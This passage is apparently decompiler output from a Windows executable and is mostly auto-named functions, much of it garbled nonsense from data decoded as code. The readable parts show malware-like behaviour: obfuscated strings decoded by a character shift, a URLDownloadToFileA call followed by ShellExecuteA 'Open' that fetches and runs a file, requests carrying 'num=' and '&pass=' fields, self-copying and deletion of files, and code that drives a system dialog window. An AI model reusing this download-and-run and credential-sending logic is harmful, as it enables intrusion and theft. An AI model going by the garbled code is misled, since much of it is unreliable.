        function_40582b();
        function_40579f();
    }
    // 0x405a97
    __writefsdword(0, *v8);
    *(int32_t *)(v9 + 8) = 0x405ad3;
    function_40341b();
    function_40341b();
    return function_40341b();
}

// Address range: 0x405acc - 0x405ad1
int32_t function_405acc(void) {
    // 0x405acc
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405ad1 - 0x405ad3
int32_t function_405ad1(void) {
    // 0x405ad1
    int32_t result; // 0x405ad1
    return result;
}

// Address range: 0x405ad3 - 0x405adc
int32_t function_405ad3(int32_t a1) {
    // 0x405ad3
    int32_t result; // 0x405ad3
    return result;
}

// Address range: 0x405b9e - 0x405be6
int32_t function_405b9e(void) {
    // 0x405b9e
    int32_t v1; // 0x405b9e
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x405b9e
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    int32_t v4; // 0x405b9e
    char * v5 = (char *)(v4 + 85); // 0x405ba2
    int32_t v6; // 0x405b9e
    *v5 = *v5 + (char)v6;
    int32_t v7 = __readfsdword(0); // bp-16, 0x405bb6
    __writefsdword(0, (int32_t)&v7);
    int32_t v8 = g103 + 1; // 0x405bbc
    g103 = v8;
    if (v8 == 0) {
        // 0x405bc4
        function_4033f7();
        function_4033f7();
    }
    // 0x405bd8
    __writefsdword(0, v7);
    return 0;
}

// Address range: 0x405be6 - 0x405beb
int32_t function_405be6(void) {
    // 0x405be6
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405beb - 0x405bed
int32_t function_405beb(void) {
    // 0x405beb
    int32_t result; // 0x405beb
    return result;
}

// Address range: 0x405bed - 0x405bef
int32_t function_405bed(int32_t a1) {
    // 0x405bed
    int32_t result; // 0x405bed
    return result;
}

// Address range: 0x405bef - 0x405bf7
int32_t function_405bef(void) {
    // 0x405bef
    g103--;
    int32_t result; // 0x405bef
    return result;
}

// Address range: 0x405bf7 - 0x405d0c
int32_t function_405bf7(void) {
    // 0x405bf7
    int32_t v1; // 0x405bf7
    if (v1 == 0) {
        // 0x405d01
        int32_t v2; // bp-24, 0x405bf7
        return *(int32_t *)((int32_t)&v2 + 4);
    }
    char * v3 = (char *)function_40374f(); // 0x405c18
    char * lpszWindow = v3; // bp-28, 0x405c18
    if (!PathFileExistsA(v3)) {
        // 0x405d01
        return *(int32_t *)((int32_t)&lpszWindow + 4);
    }
    int32_t * hWnd = FindWindowExA(NULL, (int32_t *)"#32770", NULL, lpszWindow); // 0x405c3a
    int32_t lParam = (int32_t)hWnd; // 0x405c3a
    int32_t v4 = lParam; // bp-48, 0x405c41
    if (!IsWindow(hWnd)) {
        // 0x405d01
        return *(int32_t *)((int32_t)&v4 + 4);
    }
    int32_t v5 = 66; // bp-56, 0x405c63
    int32_t * hMem = GlobalAlloc(function_40354f() + 22, 66); // 0x405c65
    if (hMem == NULL) {
        // 0x405d01
        return *(int32_t *)((int32_t)&v5 + 4);
    }
    int32_t * v6 = GlobalLock(hMem); // 0x405c75
    char * v7; // bp-64, 0x405bf7
    if (v6 == NULL) {
        // 0x405c80
        v7 = (char *)hMem;
        GlobalFree(hMem);
        // 0x405d01
        return *(int32_t *)((int32_t)&v7 + 4);
    }
    int32_t v8 = (int32_t)v6; // 0x405c75
    *v6 = 20;
    *(int32_t *)(v8 + 4) = 0;
    *(int32_t *)(v8 + 8) = 0;
    *(int32_t *)(v8 + 12) = 0;
    *(int32_t *)(v8 + 16) = 0;
    char * lpString1 = (char *)function_40374f(); // 0x405ca9
    v7 = lpString1;
    lstrcpyA(lpString1, (char *)(v8 + 20));
    GlobalUnlock(hMem);
    PostMessageA(NULL, (int32_t)hMem, 563, lParam);
    int32_t hWnd2 = function_406fb3(0x405d17, 2000, -1); // 0x405ce1
    int32_t v9 = hWnd2; // bp-104, 0x405ce8
    bool v10 = IsWindow((int32_t *)hWnd2); // 0x405ce9
    int32_t v11 = &v9; // 0x405cf0
    if (v10) {
        int32_t v12 = hWnd2; // bp-120, 0x405cfb
        SendMessageA(NULL, 0, 245, hWnd2);
        v11 = &v12;
    }
    // 0x405d01
    return *(int32_t *)(v11 + 4);
}

// Address range: 0x405d0c - 0x405e07
int32_t function_405d0c(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x405d0c
    uint32_t v1; // 0x405d0c
    *(char *)v1 = 2 * (char)v1;
    int32_t v2; // 0x405d0c
    *(char *)v2 = *(char *)&v2 + (char)(v1 / 256);
    int32_t v3 = (v1 & 14) > 9 ? v1 + 6 : v1; // 0x405d12
    bool v4 = (v1 & 14) > 9 | (v3 & 14) > 9; // 0x405d13
    int32_t v5 = (v4 ? v3 + 6 : v3) & 15; // 0x405d13
    int32_t v6 = v5 | v1 & -0x10000 | 256 * ((int32_t)v4 + (int32_t)((v1 & 14) > 9)) + v1 & 0xff00; // 0x405d13
    char * v7 = (char *)v6; // 0x405d14
    char v8 = v5; // 0x405d14
    *v7 = *v7 ^ v8;
    int32_t v9; // 0x405d0c
    char * v10 = (char *)(v9 + 0x4e2628f1); // 0x405d16
    uint32_t v11; // 0x405d0c
    *v10 = *v10 + (char)(v11 / 256);
    int32_t * v12 = (int32_t *)v6; // 0x405d1c
    *v12 = *v12 - v6;
    char * v13 = (char *)(v11 + 117); // 0x405d1e
    char v14 = *v13 + v8; // 0x405d1e
    *v13 = v14;
    if (v14 == 0) {
        int32_t v15 = function_403d17(); // 0x405d9c
        v2 = v15;
        int32_t result; // 0x405d0c
        if (v15 < 0) {
            // 0x405dbf
            function_403d0f();
            function_403ecb();
            function_403d17();
            function_40344b();
            result = -1;
        } else {
            // 0x405da7
            v2 = v15 + 1;
            function_40369b();
        }
        // 0x405e00
        return result;
    }
    // 0x405d23
    int32_t v16; // 0x405d0c
    int32_t v17 = v11 ^ v16; // 0x405d10
    int16_t v18 = v11; // 0x405d23
    __asm_outsd(v18, *(int32_t *)v17);
    __asm_outsb(v18, *(char *)v17);
    *v7 = *v7 + v8;
    __asm_iretd();
    int32_t v19; // 0x405d0c
    char * v20 = (char *)(v19 - 117); // 0x405d32
    *v20 = *v20 - 69;
    __asm_in(-0x2b45);
    int32_t v21 = __readfsdword(0); // bp-12, 0x405d3e
    __writefsdword(0, (int32_t)&v21);
    g104++;
    __writefsdword(0, v21);
    return 0;
}

// Address range: 0x405e07 - 0x405e3e
int32_t function_405e07(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x405e12
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g105 + 1; // 0x405e18
    g105 = v2;
    if (v2 == 0) {
        // 0x405e20
        function_403ed7();
    }
    // 0x405e30
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x405e3e - 0x405e43
int32_t function_405e3e(void) {
    // 0x405e3e
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405e43 - 0x405e45
int32_t function_405e43(void) {
    // 0x405e43
    int32_t result; // 0x405e43
    return result;
}

// Address range: 0x405e45 - 0x405e47
int32_t function_405e45(int32_t a1) {
    // 0x405e45
    int32_t result; // 0x405e45
    return result;
}

// Address range: 0x405e47 - 0x405e89
int32_t function_405e47(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x405e52
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g105; // 0x405e58
    g105 = v2 - 1;
    if (v2 == 0) {
        // 0x405e61
        function_403ecb();
    }
    // 0x405e7b
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x405e89 - 0x405e8e
int32_t function_405e89(void) {
    // 0x405e89
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405e8e - 0x405e90
int32_t function_405e8e(void) {
    // 0x405e8e
    int32_t result; // 0x405e8e
    return result;
}

// Address range: 0x405e90 - 0x405e92
int32_t function_405e90(int32_t a1) {
    // 0x405e90
    int32_t result; // 0x405e90
    return result;
}

// Address range: 0x405e93 - 0x405e94
int32_t function_405e93(void) {
    // 0x405e93
    int32_t result; // 0x405e93
    return result;
}

// Address range: 0x405e95 - 0x405fd6
int32_t function_405e95(int32_t a1) {
    // 0x405e95
    int32_t v1; // 0x405e95
    int32_t v2 = v1;
    *(char *)v2 = *(char *)&v1 + (char)v2;
    int32_t v3 = v1;
    *(char *)v3 = *(char *)&v1 + (char)v3;
    int32_t v4 = v1;
    *(char *)v4 = *(char *)&v1 + (char)v4;
    int32_t v5 = v1;
    *(char *)v5 = *(char *)&v1 + (char)v5;
    int32_t v6 = v1;
    *(char *)v6 = *(char *)&v1 + (char)v6;
    int32_t v7 = v1;
    *(char *)v7 = *(char *)&v1 + (char)v7;
    int32_t v8 = v1;
    *(char *)v8 = *(char *)&v1 + (char)v8;
    int32_t v9 = v1;
    *(char *)v9 = *(char *)&v1 + (char)v9;
    int32_t v10 = v1;
    *(char *)v10 = *(char *)&v1 + (char)v10;
    int32_t v11 = v1;
    *(char *)v11 = *(char *)&v1 + (char)v11;
    int32_t v12 = v1;
    *(char *)v12 = *(char *)&v1 + (char)v12;
    int32_t v13 = v1;
    *(char *)v13 = *(char *)&v1 + (char)v13;
    int32_t v14 = v1;
    *(char *)v14 = *(char *)&v1 + (char)v14;
    int32_t v15 = v1;
    *(char *)v15 = *(char *)&v1 + (char)v15;
    int32_t v16 = v1;
    *(char *)v16 = *(char *)&v1 + (char)v16;
    int32_t v17 = v1;
    *(char *)v17 = *(char *)&v1 + (char)v17;
    int32_t v18 = v1;
    *(char *)v18 = *(char *)&v1 + (char)v18;
    int32_t v19 = v1;
    *(char *)v19 = *(char *)&v1 + (char)v19;
    int32_t v20 = v1;
    *(char *)v20 = *(char *)&v1 + (char)v20;
    int32_t v21 = v1;
    *(char *)v21 = *(char *)&v1 + (char)v21;
    int32_t v22 = v1;
    *(char *)v22 = *(char *)&v1 + (char)v22;
    int32_t v23 = v1;
    *(char *)v23 = *(char *)&v1 + (char)v23;
    int32_t v24 = v1;
    *(char *)v24 = *(char *)&v1 + (char)v24;
    int32_t v25 = v1;
    *(char *)v25 = *(char *)&v1 + (char)v25;
    int32_t v26 = v1;
    *(char *)v26 = *(char *)&v1 + (char)v26;
    int32_t v27 = v1;
    *(char *)v27 = *(char *)&v1 + (char)v27;
    int32_t v28 = v1;
    *(char *)v28 = *(char *)&v1 + (char)v28;
    int32_t v29 = v1;
    *(char *)v29 = *(char *)&v1 + (char)v29;
    int32_t v30 = v1;
    *(char *)v30 = *(char *)&v1 + (char)v30;
    int32_t v31 = v1;
    *(char *)v31 = *(char *)&v1 + (char)v31;
    int32_t v32 = 0; // bp-16, 0x405ede
    int32_t v33 = __readfsdword(0); // bp-48, 0x405eef
    __writefsdword(0, (int32_t)&v33);
    int32_t v34 = a1; // bp-56, 0x405efe
    int32_t v35 = &v34; // 0x405efe
    int32_t v36 = GetClassLongA((int32_t *)-1, (int32_t)&g118); // 0x405eff
    int32_t v37 = v35; // 0x405f09
    if (v36 == 0x8002) {
        // 0x405f0f
        function_4070a7();
        int32_t v38 = function_403893(); // 0x405f21
        int32_t v39 = function_403893() - 1; // 0x405f3a
        v37 = v35;
        if (v39 >= 0 && v38 + 2 <= v39) {
            int32_t v40 = &v32; // bp-60, 0x405f46
            function_4037af(&v32);
            v37 = &v40;
            if (v32 != 0) {
                // 0x405f6b
                function_406e8f();
                function_4034fb();
                function_403557();
                DeleteFileA((char *)function_40374f());
                char * lpExistingFileName = (char *)function_40374f(); // 0x405fab
                char * v41 = lpExistingFileName; // bp-76, 0x405fab
                CopyFileA(lpExistingFileName, (char *)&g118, (bool)&g118);
                function_405bf7();
                v37 = (int32_t)&v41;
            }
        }
    }
    // 0x405fbb
    __writefsdword(0, *(int32_t *)v37);
    *(int32_t *)(v37 + 8) = 0x405fdd;
    return function_40341b();
}

// Address range: 0x405fd6 - 0x405fdb
int32_t function_405fd6(void) {
    // 0x405fd6
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405fdb - 0x405fdd
int32_t function_405fdb(void) {
    // 0x405fdb
    int32_t result; // 0x405fdb
    return result;
}

// Address range: 0x405fdd - 0x405fe9
int32_t function_405fdd(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405fdd
    int32_t v1; // 0x405fdd
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x405fee - 0x405ff8
int32_t function_405fee(void) {
    // 0x405fee
    int32_t v1; // 0x405fee
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x405fee
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    return result;
}

// Address range: 0x405ffd - 0x406014
int32_t function_405ffd(void) {
    // 0x405ffd
    int32_t v1; // 0x405ffd
    *(char *)v1 = 2 * (char)v1;
    uint32_t v2; // 0x405ffd
    int32_t v3 = (v2 & 0x100000) == 0 ? 0 : 255; // 0x406003
    int32_t v4; // 0x405ffd
    char * v5 = (char *)((v1 | (int32_t)__asm_in((int16_t)v4)) & -256 | v3); // 0x406004
    unsigned char v6 = *v5; // 0x406004
    *v5 = v6 / 128 | 2 * v6;
    uint32_t v7; // 0x405ffd
    *(char *)v4 = *(char *)&v4 + (char)(v7 / 256);
    *(int32_t *)((v2 / 0x100000 | 0x1000 * v2) - 4) = 0x405ed7;
    return EnumWindows((bool (*)(int32_t *, int32_t))&g118, (int32_t)&g118);
}

// Address range: 0x406007 - 0x406008
int32_t function_406007(int32_t a1) {
    // 0x406007
    int32_t result; // 0x406007
    return result;
}

// Address range: 0x406017 - 0x40603c
int32_t function_406017(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x406022
    __writefsdword(0, (int32_t)&v1);
    g106++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x40603c - 0x406041
int32_t function_40603c(void) {
    // 0x40603c
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406041 - 0x406043
int32_t function_406041(void) {
    // 0x406041
    int32_t result; // 0x406041
    return result;
}

// Address range: 0x406043 - 0x406045
int32_t function_406043(int32_t a1) {
    // 0x406043
    int32_t result; // 0x406043
    return result;
}

// Address range: 0x406047 - 0x40604f
int32_t function_406047(void) {
    // 0x406047
    g106--;
    int32_t result; // 0x406047
    return result;
}

// Address range: 0x40604f - 0x406087
int32_t function_40604f(void) {
    // 0x40604f
    function_4060c3();
    if (g33 == 0) {
        // 0x406083
        return 0;
    }
    int32_t result = *(int32_t *)0x408154; // 0x406061
    if (*(int32_t *)result == 0) {
        // 0x406083
        return result;
    }
    // 0x40606b
    PostQuitMessage(66);
    ExitProcess(66);
    // UNREACHABLE
}

// Address range: 0x40608a - 0x4060c1
int32_t function_40608a(void) {
    // 0x40608a
    uint32_t v1; // 0x40608a
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x40608a
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    char * v4 = (char *)(v1 + 114); // 0x40608e
    *v4 = *v4 + (char)(v1 / 256);
    int32_t v5 = v2;
    *(char *)v5 = *(char *)&v2 + (char)v5;
    if (g29 != 0) {
        // 0x40609c
        function_4060c3();
    }
    int32_t v6 = *(int32_t *)0x408148; // 0x4060a6
    int32_t timerId = SetTimer((int32_t *)0x40604f, 1000 * *(int32_t *)v6, 0, NULL); // 0x4060b6
    g29 = timerId;
    return timerId;
}

// Address range: 0x4060c3 - 0x4060e1
int32_t function_4060c3(void) {
    // 0x4060c3
    int32_t result; // 0x4060c3
    if (g29 != 0) {
        // 0x4060cc
        KillTimer((int32_t *)g29, 0);
        g29 = 0;
        result = 0;
    }
    // 0x4060e0
    return result;
}

// Address range: 0x4060e3 - 0x4060ef
int32_t function_4060e3(void) {
    // 0x4060e3
    int32_t v1; // 0x4060e3
    return function_406007(v1);
}

// Address range: 0x4060ef - 0x406116
int32_t function_4060ef(void) {
    // 0x4060ef
    if (g30 != 0) {
        // 0x4060f8
        function_406117();
    }
    int32_t timerId = SetTimer((int32_t *)0x4060e3, 0x1492, 0, NULL); // 0x40610b
    g30 = timerId;
    return timerId;
}

// Address range: 0x406117 - 0x406135
int32_t function_406117(void) {
    // 0x406117
    int32_t result; // 0x406117
    if (g30 != 0) {
        // 0x406120
        KillTimer((int32_t *)g30, 0);
        g30 = 0;
        result = 0;
    }
    // 0x406134
    return result;
}

// Address range: 0x406137 - 0x40615c
int32_t function_406137(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x406142
    __writefsdword(0, (int32_t)&v1);
    g107++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x40615c - 0x406161
int32_t function_40615c(void) {
    // 0x40615c
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406161 - 0x406163
int32_t function_406161(void) {
    // 0x406161
    int32_t result; // 0x406161
    return result;
}

// Address range: 0x406163 - 0x406165
int32_t function_406163(int32_t a1) {
    // 0x406163
    int32_t result; // 0x406163
    return result;
}

// Address range: 0x406167 - 0x40616f
int32_t function_406167(void) {
    // 0x406167
    g107--;
    int32_t result; // 0x406167
    return result;
}

// Address range: 0x40616f - 0x406175
int32_t function_40616f(void) {
    // 0x40616f
    return URLDownloadToFileA2();
}

// Address range: 0x406177 - 0x406203
int32_t function_406177(void) {
    // 0x406177
    function_40373f();
    int32_t v1 = __readfsdword(0); // bp-32, 0x406193
    __writefsdword(0, (int32_t)&v1);
    function_40354f();
    function_4038db();
    int32_t v2 = function_40354f(); // 0x4061ad
    int32_t v3 = 1; // 0x4061b6
    int32_t v4 = v2; // 0x4061b6
    if (v2 < 1) {
        // 0x4061ed
        __writefsdword(0, v1);
        return function_4033f7();
    }
    int32_t v5 = v3 - 1;
    int32_t v6; // 0x406177
    char * v7 = (char *)(v5 + v6); // 0x4061c0
    int32_t v8 = function_4037a7();
    if (*v7 != 61) {
        // 0x4061d5
        *(char *)(v8 + v5) = *v7 - 1;
    } else {
        // 0x4061c7
        *(char *)(v8 + v5) = 46;
    }
    // 0x4061e9
    v4--;
    v3++;
    while (v4 != 0) {
        // 0x4061bd
        v5 = v3 - 1;
        v7 = (char *)(v5 + v6);
        v8 = function_4037a7();
        if (*v7 != 61) {
            // 0x4061d5
            *(char *)(v8 + v5) = *v7 - 1;
        } else {
            // 0x4061c7
            *(char *)(v8 + v5) = 46;
        }
        // 0x4061e9
        v4--;
        v3++;
    }
    // 0x4061ed
    __writefsdword(0, v1);
    return function_4033f7();
}

// Address range: 0x406203 - 0x406208
int32_t function_406203(void) {
    // 0x406203
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406208 - 0x40620a
int32_t function_406208(void) {
    // 0x406208
    int32_t result; // 0x406208
    return result;
}

// Address range: 0x40620a - 0x406210
int32_t function_40620a(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x40620a
    int32_t result; // 0x40620a
    return result;
}

// Address range: 0x406213 - 0x406249
int32_t function_406213(void) {
    // 0x406213
    int32_t v1; // 0x406213
    int32_t v2; // 0x406213
    function_402827(v2, v1);
    function_40271b();
    return function_40352b();
}

// Address range: 0x40624b - 0x406392
int32_t function_40624b(void) {
    // 0x40624b
    int32_t v1; // bp-4, 0x40624b
    int32_t v2 = &v1; // 0x40624b
    int32_t v3 = v2; // 0x40624e
    int32_t v4; // 0x40624b
    for (int32_t i = 5; i > 0; i--) {
        // 0x406253
        v4 = v3;
        *(int32_t *)(v4 - 4) = 0;
        v3 = v4 - 8;
        *(int32_t *)v3 = 0;
    }
    // 0x40625a
    *(int32_t *)(v4 - 12) = 0;
    *(int32_t *)(v4 - 20) = v2;
    *(int32_t *)(v4 - 24) = 0x406392;
    int32_t v5 = __readfsdword(0); // 0x406264
    int32_t v6 = v4 - 28; // 0x406264
    *(int32_t *)v6 = v5;
    __writefsdword(0, v6);
    function_4034fb();
    function_406177();
    function_40374f();
    function_4034fb();
    int32_t v7; // bp-12, 0x40624b
    *(int32_t *)(v4 - 32) = (int32_t)&v7;
    function_4037af(&g118);
    function_4037ef();
    int32_t v8; // bp-16, 0x40624b
    *(int32_t *)(v4 - 36) = (int32_t)&v8;
    function_40354f();
    function_4037af(&g118);
    *(int32_t *)(v4 - 40) = (int32_t)"Down(";
    function_406213();
    *(int32_t *)(v4 - 48) = (int32_t)&g4;
    *(int32_t *)(v4 - 52) = v8;
    function_40360f((int32_t)&g118);
    *(int32_t *)(v4 - 56) = 0;
    *(int32_t *)(v4 - 60) = 0;
    function_40359b();
    *(int32_t *)(v4 - 64) = function_40374f();
    function_4034fb();
    function_406177();
    *(int32_t *)(v4 - 68) = function_40374f();
    *(int32_t *)(v4 - 72) = 0;
    function_40616f();
    *(int32_t *)(v4 - 76) = 1;
    *(int32_t *)(v4 - 80) = 0;
    *(int32_t *)(v4 - 84) = 0;
    function_40359b();
    int32_t v9 = function_40374f(); // 0x406365
    int32_t * v10 = (int32_t *)(v4 - 88); // 0x40636a
    *v10 = v9;
    *(int32_t *)(v4 - 92) = (int32_t)"Open";
    int32_t * v11 = (int32_t *)(v4 - 96); // 0x406370
    *v11 = 0;
    ShellExecuteA(&g118, (char *)&g118, (char *)&g118, (char *)&g118, (char *)&g118, (int32_t)&g118);
    __writefsdword(0, *v11);
    *v10 = 0x406399;
    return function_40341b();
}

// Address range: 0x406392 - 0x406397
int32_t function_406392(void) {
    // 0x406392
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406397 - 0x406399
int32_t function_406397(void) {
    // 0x406397
    int32_t result; // 0x406397
    return result;
}

// Address range: 0x406399 - 0x40639e
int32_t function_406399(int32_t a1) {
    // 0x406399
    int32_t result; // 0x406399
    return result;
}

// Address range: 0x4063be - 0x406673
int32_t function_4063be(int32_t a1, int32_t a2) {
    int32_t v1 = a2;
    int32_t v2; // 0x4063be
    *(int32_t *)v2 = v2 + 1;
    int32_t v3; // 0x4063be
    int32_t v4 = v3;
    *(char *)v4 = *(char *)&v3 + (char)v4;
    char * v5 = (char *)(v2 + 58); // 0x4063c2
    *v5 = *v5 + (char)(v3 / 256);
    int32_t v6; // 0x4063be
    char * v7 = (char *)(v6 + 112); // 0x4063c6
    int32_t v8; // 0x4063be
    *v7 = *v7 + (char)v8;
    int32_t v9; // 0x4063be
    int32_t v10; // 0x4063be
    __asm_outsb((int16_t)v10, __readgsbyte(v9));
    int32_t v11 = v3;
    *(char *)v11 = *(char *)&v3 + (char)v11;
    int32_t v12 = v3;
    *(char *)v12 = *(char *)&v3 + (char)v12;
    int32_t v13 = &v1; // 0x4063cf
    int32_t v14 = v13; // 0x4063d2
    int32_t v15; // 0x4063be
    for (int32_t i = 13; i > 0; i--) {
        // 0x4063d7
        v15 = v14;
        *(int32_t *)(v15 - 4) = 0;
        v14 = v15 - 8;
        *(int32_t *)v14 = 0;
    }
    // 0x4063de
    *(int32_t *)(v15 - 12) = 0;
    *(int32_t *)(v15 - 20) = v13;
    *(int32_t *)(v15 - 24) = 0x406673;
    int32_t v16 = __readfsdword(0); // 0x4063e8
    int32_t v17 = v15 - 28; // 0x4063e8
    *(int32_t *)v17 = v16;
    __writefsdword(0, v17);
    function_403893();
    int32_t v18; // bp-4, 0x4063be
    *(int32_t *)(v15 - 32) = (int32_t)&v18;
    function_4037af(&g118);
    int32_t v19 = v15 - 36; // 0x406419
    int32_t * v20 = (int32_t *)v19;
    int32_t v21; // bp-8, 0x4063be
    *v20 = (int32_t)&v21;
    function_40354f();
    function_4037af(&g118);
    v3 = a1 - 1;
    int32_t * v22 = v20; // 0x4063be
    int32_t v23 = v19; // 0x4063be
    switch (a1) {
        case 0: {
            // 0x406450
            v22 = v20;
            v23 = v19;
            if (function_40354f() >= 5) {
                // 0x406461
                function_4034fb();
                function_406177();
                function_4034fb();
                function_406177();
                *(int32_t *)(v15 - 48) = v18;
                *(int32_t *)(v15 - 52) = (int32_t)&g5;
                *(int32_t *)(v15 - 56) = v21;
                function_40360f((int32_t)&g118);
                *(int32_t *)(v15 - 64) = 0x4066a3;
                *(int32_t *)(v15 - 68) = v18;
                *(int32_t *)(v15 - 72) = 0x4066b3;
                *(int32_t *)(v15 - 76) = v21;
                *(int32_t *)(v15 - 80) = 0x4066c3;
                function_40751b();
                function_40360f((int32_t)&g118);
                int32_t v24 = v15 - 92; // 0x4064ef
                int32_t * v25 = (int32_t *)v24;
                int32_t v26; // bp-40, 0x4063be
                *v25 = (int32_t)&v26;
                function_4034fb();
                function_406177();
                int32_t v27 = function_403893(); // 0x406513
                int32_t * v28 = (int32_t *)(v15 - 96); // 0x406519
                *v28 = v27 - 1;
                function_4034fb();
                function_406177();
                function_4037af(&g118);
                *v28 = v26;
                function_4034fb();
                function_406177();
                function_4034fb();
                function_406177();
                function_405857((int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118);
                v22 = v25;
                v23 = v24;
            }
            // break -> 0x406658
            break;
        }
        case 1: {
            // 0x406590
            v22 = v20;
            v23 = v19;
            if (function_40354f() >= 5) {
                // 0x4065a1
                *(int32_t *)(v15 - 40) = (int32_t)"num=";
                function_404ba7();
                *(int32_t *)(v15 - 48) = (int32_t)"&pass=";
                function_404ba7();
                int32_t v29 = v15 - 52; // 0x4065c4
                function_40360f((int32_t)&g118);
                function_4034fb();
                function_406177();
                function_404cff();
                v22 = (int32_t *)v29;
                v23 = v29;
            }
            // break -> 0x406658
            break;
        }
        case 2: {
            // 0x4065fe
            v22 = v20;
            v23 = v19;
            if (function_40354f() >= 5) {
                // 0x40660b
                *(int32_t *)(v15 - 40) = (int32_t)"num=";
                function_404ba7();
                *(int32_t *)(v15 - 48) = (int32_t)"&pass=";
                function_404ba7();
                int32_t v30 = v15 - 52; // 0x40662e
                function_40360f((int32_t)&g118);
                function_406177();
                function_404cff();
                v22 = (int32_t *)v30;
                v23 = v30;
            }
            // break -> 0x406658
            break;
        }
    }
    // 0x406658
    __writefsdword(0, *v22);
    *(int32_t *)(v23 + 8) = 0x40667a;
    return function_40341b();
}

// Address range: 0x406673 - 0x406678
int32_t function_406673(void) {
    // 0x406673
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x406678 - 0x40667a
int32_t function_406678(void) {
    // 0x406678
    int32_t result; // 0x406678
    return result;
}

// Address range: 0x40667a - 0x406681
int32_t function_40667a(int32_t a1) {
    // 0x40667a
    int32_t result; // 0x40667a
    return result;
}

// Address range: 0x4066a6 - 0x4066a9
int32_t function_4066a6(void) {
    // 0x4066a6
    int32_t result; // 0x4066a6
    return result;
}

// Address range: 0x4066ae - 0x4066b5
int32_t function_4066ae(void) {
    // 0x4066ae
    int32_t v1; // 0x4066ae
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x4066ae
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    uint32_t v3 = result;
    *(char *)v3 = *(char *)&result + (char)(v3 / 256);
    return result;
}

// Address range: 0x4066b5 - 0x4066b9
int32_t function_4066b5(void) {
    // 0x4066b5
    return function_4066f3();
}

// Address range: 0x4066f1 - 0x4066f3
int32_t function_4066f1(void) {
    // 0x4066f1
    int32_t result; // 0x4066f1
    *(char *)result = 2 * (char)result;
    return result;
}

// Address range: 0x4066f3 - 0x4067a0
int32_t function_4066f3(void) {
    // 0x4066f3
    bool v1; // 0x4066f3
    if (v1) {
        // 0x406757
        function_404633();
    } else {
        bool v2; // 0x4066f3
        if (v2) {
            // 0x4066f8
            int32_t result; // 0x4066f3
            return result;
        }
    }
    // 0x40676b
    CreateThread(NULL, (int32_t)&g118, (int32_t (*)(int32_t *))&g118, &g118, (int32_t)&g118, &g118);
    int32_t v3; // 0x4066f3
    int32_t lpThreadAttributes = v3 + 20; // 0x406772
    CreateThread((struct _SECURITY_ATTRIBUTES *)lpThreadAttributes, 0, NULL, (int32_t *)0x4063cf, 0, NULL);
    int32_t Msg = *(int32_t *)(v3 + 16); // 0x40678c
    int32_t lParam = *(int32_t *)(v3 + 8); // 0x406791
    int32_t wParam; // 0x4066f3
    return DefWindowProcA((int32_t *)*(int32_t *)lpThreadAttributes, Msg, wParam, lParam);
}

// Address range: 0x4067a3 - 0x4067d8
int32_t function_4067a3(void) {
    // 0x4067a3
    return SetWindowLongA((int32_t *)0x406727, -4, function_404643(0, 0, 0, 0, 0, 0, 0, (int32_t)g82, 0));
}

// Address range: 0x4067d8 - 0x4068f8
int32_t function_4067d8(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t lpClassName, int32_t a6, int32_t a7) {
    // 0x4067d8
    int32_t v1; // 0x4067d8
    unsigned char v2 = (char)v1;
    *(char *)v1 = 2 * v2;
    char * v3 = (char *)(v1 + 114); // 0x4067da
    uint32_t v4; // 0x4067d8
    char v5 = v4 / 256; // 0x4067da
    *v3 = *v3 + v5;
    unsigned char v6 = v2 - 32; // 0x4067dd
    int32_t result = v1 & -256 | (int32_t)v6; // 0x4067dd
    if (v2 >= 32 && v6 != 0) {
        // 0x406850
        return result;
    }
    char * v7 = (char *)(result + 105); // 0x4067e1
    *v7 = *v7 & v5;
    int16_t v8 = a3; // 0x4067e5
    __asm_outsb(v8, *(char *)a6);
    char * v9 = (char *)(lpClassName + 105 & 0xffff); // 0x4067e6
    *v9 = *v9 & (char)(a2 / 256);
    char * v10 = (char *)(a2 + 115 + 2 * lpClassName); // 0x4067ea
    char v11 = *v10 + (char)a2; // 0x4067ea
    *v10 = v11;
    if (v11 == 0) {
        int32_t * v12 = (int32_t *)(a4 - 0x7e17ac28); // 0x406839
        *v12 = *v12 - 1;
        return -0x22e618 * *(int32_t *)a1;
    }
    // 0x4067f0
    __asm_outsd(v8, *(int32_t *)a6);
    int32_t * v13 = FindWindowA((char *)lpClassName, (char *)&g118); // 0x406807
    if (v13 != NULL) {
        // 0x406850
